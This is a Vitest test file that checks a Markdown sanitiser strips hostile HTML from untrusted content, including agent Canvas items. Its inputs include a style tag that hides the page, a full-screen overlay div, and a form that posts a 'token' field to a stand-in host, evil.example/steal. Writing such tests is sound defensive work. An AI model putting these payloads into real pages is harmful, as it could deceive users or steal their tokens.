// @vitest-environment jsdom
/** The Markdown pipeline renders untrusted content (agent Canvas items, repo docs) inside Codekin's origin. */
import { describe, expect, it } from 'vitest'
import { renderMarkdownToSafeHtml } from './markdownPipeline'

const render = (md: string) => {
  const div = document.createElement('div')
  div.innerHTML = renderMarkdownToSafeHtml(md)
  return div
}

describe('renderMarkdownToSafeHtml', () => {
  it('drops anything that could restyle or overlay the app', () => {
    const el = render([
      '<style>body *{visibility:hidden}</style>',
      '<div style="position:fixed;inset:0;z-index:99999" id="x" name="y" class="fixed inset-0 z-50 bg-page">overlay</div>',
      '<span class="sr-only">hidden from the user</span>',
    ].join('\n\n'))
    expect(el.querySelector('style')).toBeNull()
    const div = [...el.querySelectorAll('div')].find(d => d.textContent === 'overlay')!
    expect(div.getAttribute('style')).toBeNull()
    expect(div.getAttribute('id')).toBeNull()
    expect(div.getAttribute('name')).toBeNull()
    expect(div.getAttribute('class')).toBeNull()
    expect(el.querySelector('span')!.getAttribute('class')).toBeNull()
  })

  it('drops forms, buttons, text inputs and inline SVG', () => {
    const el = render('<form action="https://evil.example/steal"><input name="token"><button>Go</button><textarea></textarea></form>\n\n<svg><a xlink:href="https://evil.example"><text>x</text></a></svg>')
    expect(el.querySelector('form, button, textarea, svg')).toBeNull()
    expect(el.querySelector('input')).toBeNull()
  })

  it('keeps GFM task lists (read-only), code highlighting and safe links', () => {
    const el = render('- [x] done\n- [ ] todo\n\n```js\nconst a = 1\n```\n\n[site](https://example.com)')
    const boxes = el.querySelectorAll('input')
    expect(boxes).toHaveLength(2)
    boxes.forEach(b => { expect(b.getAttribute('type')).toBe('checkbox'); expect(b.hasAttribute('disabled')).toBe(true) })
    expect(el.querySelector('code')!.className).toMatch(/hljs language-js/)
    expect(el.querySelector('.hljs-keyword')).not.toBeNull()
    const a = el.querySelector('a')!
    expect(a.getAttribute('target')).toBe('_blank')
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
  })
})
